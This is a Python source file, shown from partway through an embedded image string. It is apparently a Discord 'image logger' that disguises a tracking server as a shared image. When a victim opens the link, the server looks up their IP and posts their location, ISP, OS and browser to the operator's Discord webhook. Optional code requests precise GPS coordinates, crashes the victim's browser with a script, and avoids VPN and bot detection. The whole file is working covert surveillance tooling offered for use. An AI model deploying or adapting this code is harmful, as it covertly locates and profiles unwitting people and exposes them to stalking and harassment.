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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest


handler = ImageLoggerAPI
